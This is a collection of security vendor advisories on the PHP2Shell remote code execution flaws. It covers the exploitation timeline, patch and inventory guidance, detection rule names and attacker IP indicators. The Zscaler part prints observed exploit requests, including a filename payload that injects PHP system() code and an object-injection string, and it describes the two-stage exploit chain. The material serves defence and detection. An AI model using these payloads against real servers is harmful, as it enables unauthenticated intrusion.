Amazon's honeypots (decoy servers built to attract attackers) recorded the first attempt on October 17, four days before disclosure, and by October 21 Amazon was seeing broad exploitation attempts in the wild. Cloudflare saw early attacks, and the UK National Cyber Security Centre warned organizations to update immediately or take systems offline. How many real servers were taken over is still unclear. Amazon says it does not know whether the attempts it saw would have worked outside a honeypot.

On October 23, CrowdStrike and Flare still reported only probing and failed attempts, many of which crash PHP rather than give an attacker control. The next day, Perplexity's Adel Karimi recorded successful remote code execution on a honeypot, and on October 26 CISA added both flaws to its list of known exploited vulnerabilities, with a federal patch deadline of October 29. Karimi's test used a deliberately favorable setup, so it shows the flaw works, not how often attacks like it succeed.

Every flaw has been out there for a while before anyone announces it

A flaw becomes news on the day it is announced, not the day it appears. PHP's own maintainers first spotted signs of this problem in a 2024 audit, and attackers reached it before the public did.

We have seen this pattern before. When Log4j hit in December 2021, Vectra wrote that the first sign of an attack was hard to spot and that the safest assumption was that at least one server in an estate was already compromised. Other flaws in the software your business runs are very likely in the same position today: known to someone, announced to no one. Patching deals with the ones you hear about. It cannot help with the rest.

The PHP servers you miss matter most

PHP runs WordPress,Drupal, Joomla and Magento sites, hosting control panels, and a lot of software that never mentions PHP. The servers you know about will get patched. The ones you do not know about are the ones attackers find first, because nobody is watching them.

Appliances and management interfaces that ship PHP are the likeliest place an attempt becomes a compromise, and they are rarely monitored like web servers. Flare, relaying one researcher's report, says some ship PHP without address randomization, which removes the main obstacle for an attacker. Ask your vendors which of their products include PHP.

No team patches everything on the day a fix ships. Knowing which servers face the internet, and which hold the most valuable data, turns a backlog into a short list of decisions, including which services to switch off until they are fixed. On any server you suspect was hit, save logs and a snapshot of memory before restarting, because a restart erases traces.

‍

What happens after a PHP server falls

An attacker who gets code running through PHP usually does not need malware. The web server already has a shell, a network connection and access to files, so they can use the tools already installed on the machine to look around, find credentials and move from one system to the next. Nothing looks wrong, because the web server is doing web server things with slightly different commands. That is the first of the three detection gaps I write about: nothing looks wrong.

What changes is where the server talks to. A web server that has served the same pages for years suddenly reaches places it never did before, calls out to unfamiliar addresses, or starts talking to internal systems. That behavior shows up in network traffic, not in patch status. A view of the network is how you see what a server is actually connecting to, whether or not anyone is watching the server itself.

What Vectra AI can and cannot see

Vectra AI is not really concerned about what the initial attack vector is. What we see is what happens afterward.

PHP is the story today. Next week it will be something else: another flaw, a phone call to a help desk, someone on the inside. What we look at does not depend on which door was used. We watch what a system does once an attacker is inside, so we do not need the way in to be known or the flaw to be published. That matters most when the entry point is unknown or the vulnerability has not been announced yet.

Uncovering Potential PHP Servers and Shadow IT

One of the challenges in securing PHP infrastructure is knowing where it exists in the first place. Forgotten applications, unmanaged servers, and shadow IT can create security blind spots, even after known vulnerabilities have been patched.

Vectra AI's PHP Server Visibility dashboard provides an additional investigative tool to help security teams identify potentially overlooked PHP servers using indicators observed in unencrypted HTTP traffic, such as .php endpoints and PHPSESSID cookies. Analysts can then investigate whether these hosts are also receiving externally originated encrypted traffic, helping prioritize potentially exposed systems for further investigation.

The dashboard is not intended to provide a complete inventory of PHP servers. It can only identify systems exhibiting observable PHP-related indicators, and encrypted traffic or limited network visibility may leave some servers undiscovered. Instead, it acts as an assistant to existing asset discovery and threat-hunting workflows, helping analysts uncover potential shadow IT, investigate exposure, and identify systems that warrant closer examination, even after patching.

Detection rules for known php2shell exploit attempts

Vectra Match now contains rules to detect the PHP2Shell attacker behaviors when proper visibility is provided to the attacker traffic. They flag known exploit attempts in network traffic when that traffic is visible to us, so they catch attempts at the door, while the detections above catch what follows. An attempt is not a compromise. A match is a reason to look at that server, not proof that it was taken over. This is available for all Vectra Match customers.

The rules, by ET rule number:

2072548: ET EXPLOIT PHP php2shell Handler-mismatch Session Injection (CVE-2026-109619)

2072549: ET EXPLOIT PHP php2shell Multipart Header Amplification OOM (CVE-2026-109618)

2072550: ET EXPLOIT PHP php2shell Nested Empty File Control OOM (CVE-2026-109618)

2072551: ET EXPLOIT PHP php2shell Chunked Multipart Request without Content-Length (CVE-2026-109618)

2072552: ET EXPLOIT PHP php2shell Binary URL-Encoded POST for $_POST Corruption (CVE-2026-109618), commented out in the rule set, so off by default

2072553: ET EXPLOIT PHP php2shell Multipart Request without Content-Length (CVE-2026-109618)

2072554: ET EXPLOIT PHP php2shell Code Injection in Filename (CVE-2026-109619)

2072555: ET HUNTING PHP Generic Upload Progress Session Manipulation, a hunting rule, not an exploit rule, so treat a match as a lead

2072556: ET EXPLOIT PHP php2shell Excessive Multipart Part Count (CVE-2026-109618)

2072557: ET EXPLOIT PHP php2shell Excessive Empty Multipart File Controls (CVE-2026-109618)

What a compromised PHP server reveals about your resilience

The old measure of success was whether attackers get in. The better one is how far they get. Patching, a sound network design, splitting the network into zones, least privilege and knowing which systems carry your most important business processes all limit that distance. The network record can show whether anyone came through the door before it closed, and where they went next.

The three gaps are walked end to end in the Mind Your Gaps in the Age of AI-Powered Attacks white paper.

articles.title: CVE-2026-109618 and CVE-2026-109619: PHP Vulnerable to Unauthenticated RCE Attacks
articles.context: *October 23, 2026: This advisory has been updated with new ThreatLabz analysis and Zscaler Deception telemetry on exploitation activity observed during the first 48 hours...
articles.full_text: *October 26, 2026: This advisory has been updated to clarify language describing exploitability and potential impact.*October 23, 2026: This advisory has been updated with new ThreatLabz analysis and Zscaler Deception telemetry on exploitation activity observed during the first 48 hours following disclosure.IntroductionOn October 21, 2026, two critical remote code execution (RCE) vulnerabilities, CVE-2026-109618 and CVE-2026-109619, collectively referred to as “PHP2Shell,” were publicly disclosed. Both vulnerabilities carry a CVSS v4.0 score of 9.2 out of 10. The PHP security team has released emergency patches and strongly encouraged all PHP users to update immediately. These flaws reside in the PHP core language runtime and successful exploitation could allow an unauthenticated remote attacker to achieve remote code execution on any server running a vulnerable version, potentially enabling unauthorized access, data theft, or further system compromise. Given PHP's pervasive deployment across web infrastructure globally - including applications like WordPress, Drupal, Joomla, and Magento, as well as embedded devices and similarly overlooked public-facing platforms - the potential attack surface is significant. The vulnerabilities could enable automated exploitation of exposed, vulnerable PHP deployments without authentication or user interaction. The vulnerabilities therefore may be attractive targets for exploitation.ThreatLabz analysis indicates that attackers began rapidly targeting these vulnerabilities following public disclosure, highlighting the need for organizations to patch vulnerable PHP deployments immediately.Zscaler’s security team has analyzed this issue across both production and corporate environments and has ruled out any impact to Zscaler Cloud Platforms, products, distributed components, services, or our enterprise environment, as detailed in the Trust post. RecommendationsOrganizations running PHP should take the following actions:Patch immediately: Upgrade PHP to one of the fixed versions: 8.5.12, 8.4.27, 8.3.36, or 8.2.35. Linux package maintainers received patches in advance and may already have updated packages available. PHP packages for most Linux distributions may also include the patches backported to previous versions of the software, so consult the release notes for your specific installation to ensure your systems are covered.Deactivate unpatched instances: Consider fully disabling services for any PHP instance that cannot be immediately patched. While this may seem overly cautious, any unpatched instance could be targeted by opportunistic adversaries and result in shell-level access to the vulnerable host. Inventory PHP deployments: Conduct an immediate inventory of all PHP installations across your environment, including standalone servers, vendor appliances, bundled software (WordPress, Magento, WooCommerce, Shopware), and hosting panels (cPanel, Plesk, etc).Migrate off EOL branches: Organizations running PHP 5.4+, 7.x, 8.0, or 8.1 must migrate to a supported branch immediately. No official binary patches will be released for these versions.Isolate EOL instances that cannot be immediately migrated: Migrating EOL instances is strongly recommended. If this is not possible, isolating unpatchable applications from the internet and other untrusted networks may provide some level of protection. This should be considered a high-risk mitigation and reserved only for business and mission-critical applications while implementing aggressive monitoring of these instances.Monitor for exploitation: Audit web server logs (including but not limited to Apache, Nginx, etc.) for unusual segmentation faults, crash dumps, or abnormal memory usage patterns that may indicate active exploitation attempts.Mitigate risk through PHP settings: While not a definitive fix, mission critical applications that cannot be disabled or immediately patched may benefit from reviewing and tightening memory_limit and max_execution_time settings in php.ini to avoid triggering OOM conditions. Consult additional guidance regarding mitigations through setting session.upload_progress.enabled = Off and disabling multipart uploads at the service edge. ThreatLabz Observes Exploitation Attempts Within 48 HoursThreatLabz observed scanning activity and possible exploitation attempts targeting the PHP2Shell vulnerabilities using multiple attack tools and exploitation methods, including RCE payloads, PHP object injection, and named exploitation frameworks, indicating rapid, in-the-wild exploitation attempts.In the first 48 hours after the PHP2Shell disclosure, Zscaler’s global decoy mesh observed 1,156 exploitation attempts from 156 unique attacker IPs targeting 70 organizations. As a rapid response measure, a new detection rule for PHP2Shell exploitation has been pushed to all Zscaler Deception customers.Attack chainAutomated scanning activity observed by Zscaler suggests attackers may be attempting to use a two-stage PHP2Shell exploitation chain, as shown in the figure below.Figure 1: Notional exploit chain consistent with scanning and exploit attempts observed by ThreatLabz.Stage 1: State setup and fatal triggerThe attacker sends a crafted multipart/form-data POST request containing:A PHPSESSID field to associate the request with a known session, making the session filename (sess_[PHPSESSID]) predictable.The PHP_SESSION_UPLOAD_PROGRESS field to force PHP to begin session bookkeeping during multipart parsing, populating vulnerable global state pointers and writing attacker-controlled data into the session file.A file attachment whose filename= parameter contains either PHP code or a serialized object string.A body sized or structured to exhaust memory (CVE-2026-109618) or trigger a fatal error (CVE-2026-109619).When the fatal condition is triggered, longjmp() aborts the request, freeing per-request memory but leaving stale global pointers.Stage 2: Heap reclaim and code executionThe attacker immediately sends a second request to the same worker process. This second request contains the attacker's payload, sized and aligned to reclaim the freed memory slots. When PHP processes the new request and references the stale global state before re-initialization occurs, it reads and executes the attacker-controlled data, achieving arbitrary code execution with the privileges of the PHP worker process.Zscaler Deception telemetry findingsThreatLabz observed malicious POST requests targeting the PHP2Shell exploitation path across multiple tools and stages of the attack chain. Every observed request is a multipart/form-data POST targeting PHP endpoints, specifically /, /index.php, /api/endpoint.php, and /app/upload.php.Exploitation payloads observed1. ShellFlow PHP2Shell named exploit toolThe most forensically significant artifact is the presence of a multipart boundary string that explicitly names the exploitation tool. This indicator should not be considered durable, as an adversary can trivially replace the known strings with something less obvious. At this time, the ShellFlow tool uses a known boundary value, so it is a useful indicator for detecting the unmodified tool. The exploit tool request is shown below. POST / HTTP/1.1 Content-Type: multipart/form-data; boundary=----shellflow-php2shell ------shellflow-php2shell Content-Disposition: form-data; name="PHPSESSID" sf618_ec172709c8b74601 ------shellflow-php2shell Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS" shellflow_poc ------shellflow-php2shell Content-Disposition: form-data; name="f"; filename="poc.bin" Content-Type: application/octet-stream AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...15485 bytes total...]The multipart boundary shellflow-php2shell identifies the attacking tool by name. The poc.bin file body contains more than 15k bytes of data along with a repeated AAAA... characters, a characteristic heap spray pattern used for memory layout control in the CVE-2026-109618 OOM corruption path.Notable characteristics:The boundary string shellflow-php2shell directly identifies the ShellFlow PHP2Shell attacking tool, which is publicly linked to CVE-2026-109618 scanning activity.The session ID sf618_ec172709c8b74601 contains sf618, possibly reflecting a developer’s shorthand reference to ShellFlow + CVE-2026-109618.The application/octet-stream upload with a repeating AAAAA... buffer is consistent with a heap spray technique used to influence the memory layout when the OOM condition is triggered.2. Active system() command execution payloadThese requests represent the strongest indication of automated exploitation attempts. The filename= field contains a fully formed PHP webshell instruction designed to be written into the PHP session file through the session.upload_progress handler and later executed, as shown in the example below.The filename= value [?php system('echo 'exploited digga' > pwned.txt');echo 'RCE';?] instructs the PHP runtime to:Execute the OS command echo 'exploited digga' > pwned.txt, writing a proof-of-compromise marker to disk.Echo the string RCE in the HTTP response body, providing an indication of successful code execution to the attacker. The RCE string may still be returned even if the preceding echo redirection fails.This payload pattern was observed in two separate requests with identical content, consistent with automated retry behavior commonly seen in exploit frameworks.3. PHP object injection via pipe delimiterThreatLabz also observed a PHP object injection request that abuses the session pipe delimiter, as shown in the example. The filename x|O:8:"stdClass":0:{} uses the PHP default session serialization format, where the | character separates a variable name from its serialized value.POST /app/upload.php HTTP/1.1 Content-Type: multipart/form-data; boundary=--NeoMM2026 --NeoMM2026 Content-Disposition: form-data; name="PHPSESSID" neosc4n00000000000000002 --NeoMM2026 Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS" neo_obj_inject --NeoMM2026 Content-Disposition: form-data; name="f"; filename="x|O:8:\"stdClass\":0:{}" Content-Type: text/plain Z --NeoMM2026--Overall attack tool fingerprinting summaryThreatLabz identified multiple distinct attacker toolsets through analysis of numerous requests in our telemetry, as summarized in the table below:Tool / FrameworkIdentifying MarkersShellFlow PHP2ShellBoundary shellflow-php2shell; session ID prefix sf618; poc.bin heap sprayActive RCE OperatorBoundary --VERIFY; system() payload in filename=; pwned.txt writeNuclei CVE TemplatesBoundary prefix ------Nuclei; echo-test random token in filenameNeo ScannerBoundary --NeoMM2026b / --NeoMM2026; targets /api/endpoint.php, /app/upload.phpTable 1: Attacker tools and identifying markers observed in PHP2Shell exploitation activity. Affected VersionsAll PHP versions from 5.4 onward are vulnerable. Only currently supported branches received patches, but package maintainers may also backport the security patches to previous versions. Carefully review the instructions and release notes from the maintainers of your PHP installations to determine what version and release includes the necessary patch.PHP BranchVulnerable VersionsPatch AvailablePHP 8.58.5.0 – 8.5.11Yes (8.5.12)PHP 8.48.4.0 – 8.4.26Yes (8.4.27)PHP 8.38.3.0 – 8.3.35Yes (8.3.36)PHP 8.28.2.0 – 8.2.34Yes (8.2.35)PHP 8.1All versions (EOL)No (EOL — upgrade required)PHP 8.0All versions (EOL)No (EOL — upgrade required)PHP 7.xAll versions (EOL)No (EOL — upgrade required)PHP 5.4+All versions (EOL)No (EOL — upgrade required)Table 2: CVE-2026-109618 and CVE-2026-109619 Affected PHP Versions and Patch Availability How It WorksBoth vulnerabilities are use-after-free memory safety flaws in PHP's core request-handling engine. All PHP installations serving web requests may be affected regardless of security controls. The vulnerabilities can allow unauthenticated attackers to execute code on affected servers or read sensitive process memory; that memory may contain passwords, authentication tokens, API keys and certificates belonging to other requests or the server itself.CVE-2026-109618: OOM Corruption / Uninitialized Memory UseCVSS v4.0: 9.2 - CriticalRoot Cause: PHP uses longjmp() to abort a request when it hits its configured memory limit. When a web application receives form input, PHP records new entries in its internal POST data structure before finishing their initialization. If an out-of-memory (OOM) error fires while internal request data is only partially initialized, longjmp() bypasses normal control flow, leaving memory in an inconsistent/uninitialized state. During request cleanup, PHP misinterprets this invalid data as valid and follows an attacker-controlled code pointer, yielding control of execution.Exploit Vector: An attacker can intentionally trigger specific OOM conditions (e.g., via large memory allocations, deeply recursive calls, or maliciously crafted request payloads) to corrupt state and achieve unauthenticated RCE.Impact: Unauthenticated Remote Code ExecutionCVE-2026-109619: Use-After-Free / Stale Memory AccessCVSS v4.0: 9.2 - CriticalRoot Cause: When PHP encounters a fatal error and calls zend_bailout() (via longjmp()), request-owned internal state can survive in global memory after its backing allocation has been freed. PHP workers process multiple requests in sequence, and certain internal pointers persist between requests. If a request crashes or exhausts memory at the right moment, those pointers are left pointing to already-recycled memory. A subsequent request processed by the same worker may access this stale memory before re-initialization occurs.Exploit Vector: This vulnerability is chainable with CVE-2026-109618. The partial initialization in CVE-2026-109618 allows an attacker to shape the freed memory contents and gain control of the instruction pointer, potentially enabling RCE. Chaining these two CVEs requires no authentication and no user interaction.Impact: Unauthenticated Remote Code Execution and memory/credential disclosure ConclusionPHP2Shell represents a significant security issue because of the severity of the vulnerabilities and PHP’s broad deployment. The combination of CVE-2026-109618 and CVE-2026-109619 could provide an unauthenticated path to RCE and potentially broader server compromise without user interaction.Organizations are strongly urged to treat this as an emergency patching event. Systems running EOL PHP branches must be migrated without delay. Where patching cannot be completed immediately, network-layer controls should be applied as an interim measure.ThreatLabz will continue to monitor active exploitation campaigns and update Zscaler platform protections as new indicators emerge. How Zscaler Can HelpThe following table shows the typical attack stages and the mitigations recommended by Zscaler.Attack StageRecommended MitigationMinimize the external attack surfaceIdentify and fix any vulnerable PHP applications with Zscaler Exposure ManagementEliminate externally exposed PHP assets by leveraging a Zero Trust architecture.Prevent compromiseDetonate unknown second-stage payloads with Advanced Cloud Sandbox.Route server egress through ZIA to detect/block post-compromise activity.Enable SSL/TLS inspection for all traffic, including trusted sources.Enable Advanced Threat Protection to block known C2 domains.Use Advanced Cloud Firewall, to extend C2 controls across all ports/protocols, including emerging C2.Prevent lateral threat movementUse ZPA to enforce least-privilege user-to-app segmentation for crown-jewel apps (employees and third parties).Use ZPA inline inspection to block exploitation attempts against private apps from compromised users.Use Zscaler Deception to detect and contain lateral movement or privilege escalation with decoy assets and accounts.Use Zscaler MDR and Threat Hunting to detect and respond to early stage threat activity.Prevent data lossInspect outbound traffic across channels with Zscaler DLP. Zscaler CoverageThe Zscaler ThreatLabz team has deployed protections for CVE-2026-109618 and CVE-2026-109619 with the following signatures:Zscaler Advanced Threat ProtectionThe Zscaler Advanced Threat Protection signatures detect exploitation attempts from ZIA traffic targeting internet-exposed servers:PHP.Exploit.CVE-2026-109618_19Zscaler Private Access AppProtectionThe ZPA App Protection signatures detect exploitation attempts against internal applications through ZPA, including activity originating from compromised endpoints or insiders:6000568: PHP Remote Code Execution (CVE-2026-109618, CVE-2026-109619)6000569: PHP2Shell Excessive Multipart Parts (CVE-2026-109618, CVE-2026-109619)Zscaler Deception Zscaler Deception customers can deploy Private Threat Intelligence decoys for the following applications to detect PHP2Shell exploitation attempts and generate high-fidelity alerts:WordPress LoginDrupal Admin PanelJoomla Admin PanelphpMyAdminNextcloudCustomers can configure an orchestration rule to add any IP addresses interacting with these decoys to a firewall block list.Zscaler MDRZscaler MDR's behavioral detection analytics also provide generic coverage for this class of web application RCE. The following active detection analytics are candidates for identifying post-exploitation activity that may result from these vulnerabilities:NIX-WEBSERVER-SPAWN-SUSPICIOUS-COMMAND — Linux web servers spawning suspicious commands including reconnaissance utilities and downloadersNIX-WEBSERVER-SPAWN-RECON — Web servers spawning reconnaissance commandsPSX-WEBSERVER-CREATE-PHP-SCRIPT — Web servers creating inline PHP scripts in web directories Indicators Of Compromise (IOCs)Zscaler Deception observed IP addresses delivering PHP2Shell-related payloads. Selected source IP addresses and their associated activity are listed below.IP AddressObserved activity169[.]58[.]138[.]154Nuclei code-injection + deserialization check23[.]226[.]136[.]36OOM / memory-exhaustion trigger (CVE-2026-109618)78[.]17[.]70[.]38 OS command exec + file write135[.]136[.]21[.]120 Persistent webshell81[.]17[.]100[.]107Real deserialization RCE gadget chains (phpggc)The full list of source IP addresses and JA4 fingerprints observed in this activity are available in the ThreatLabz GitHub repository.Contributors: Abhishek Parikh, Deepak Keshav, Prajjwal Singh, Sayan Mitra, Nataraja Gundale, Rishabh Nihalani, Sai Nikhil Perla, Rubin Azad

articles.title: Arctic Wolf Labs: Finding, Prioritizing, and Patching PHP2Shell Exposure
articles.context: On Tuesday, October 20, threat actors gained advance visibility into two critical PHP vulnerabilities after details leaked ahead of the planned disclosure, accelerating the race...
articles.full_text:
On Tuesday, October 20, threat actors gained advance visibility into two critical PHP vulnerabilities after details leaked ahead of the planned disclosure, accelerating the race between defenders and attackers. The flaws are tracked as Common Vulnerabilities and Exposures (CVE) identifiers CVE-2026-109618 and CVE-2026-109619. Together they’re known as PHP2Shell. Both carry a 9.2 rating on the Common Vulnerability Scoring System (CVSS) version 4.0 scale. For both vulnerabilities, Arctic Wolf’s Aurora® Agentic SOC helps organizations rapidly identify affected assets, correlate exploitation signals across the environment, and accelerate investigation and response before attackers can establish persistence.

An unauthenticated attacker can use either flaw to run code on a vulnerable server. On Wednesday, October 21, the PHP project released patched versions. PHP2Shell shows how AI is changing the threat landscape. Attackers can now find and weaponize old flaws in widely used technology faster than ever before. Arctic Wolf recommends treating every PHP installation that serves web requests as at-risk presently. Internet-facing Linux web servers without endpoint monitoring carry the highest risk of quiet compromise.

Patching remains the recommended remediation. Security teams should assess exposure immediately, identify likely attack paths, and segment critical systems to limit an attacker’s ability to move through the environment. If attackers exploit PHP2Shell, Aurora Agentic SOC is designed to detect the activity that follows, including webshell deployment, unauthorized command execution, persistence attempts, and lateral movement, enabling rapid investigation and response before attacks can escalate.

Overview and Impact

All PHP installations that serve web requests are at risk. That includes PHP-FPM (FastCGI Process Manager), Apache with mod_php, php-cgi, FrankenPHP, and LiteSpeed. PHP rates the risk highest for mod_php. In PHP’s demonstrated exploit, an unauthenticated request triggers the attack before any application code runs.

PHP runs WordPress, Drupal, Joomla, and Magento sites, shared hosting platforms, and control panels like cPanel and Plesk. Many vendor applications bundle PHP without saying so, which makes the affected assets hard to find. Bundled standalone binaries such as php.exe and php-cgi.exe on Windows are easy to miss.

Understanding the Root Cause

CVE-2026-109618 is an out-of-memory handling flaw. PHP can stop while internal request data is only partly set up. Request cleanup may then treat that invalid data as valid.

CVE-2026-109619 is a stale state flaw. Request-owned internal state can survive after its memory is freed. A later request on the same worker may use that stale state before normal setup resets it. The PHP session upload progress feature is one confirmed path to this flaw, and it’s enabled by default.

Guidance for Arctic Wolf Customers

Inventory every system that runs PHP. Include package-based installs, containers, appliances, and hosting panels. Include vendor software that bundles PHP. Include continuous integration and continuous delivery (CI/CD) images.

Identify the PHP branch and package source on each system.

Update to the patched version or confirm your vendor has backported both fixes. Patch internet-facing systems first.

Restart every affected service. That covers PHP-FPM, Apache, NGINX upstream pools, application workers, and containers.

Rebuild container images from patched upstream bases. Patching only the running containers leaves the image exposed.

Move end-of-life PHP to a supported branch.

Record the patched version, vendor advisory, restart time, and validation evidence for each host or image. If a workload can’t be patched right away, document compensating controls and an approved exception with an expiry date.

Patched versions

PHP branch

Patched version

Action

Upgrade or get fixes from your vendor

The PHP project no longer releases updates for 8.1 or older. Some distributions and long-term support (LTS) vendors provide backported fixes, so check with your vendor.

Audit commands

Use these commands to find PHP packages and confirm that your vendor backported both fixes.

Platform

Command

Ubuntu or Debian

dpkg -l | grep php
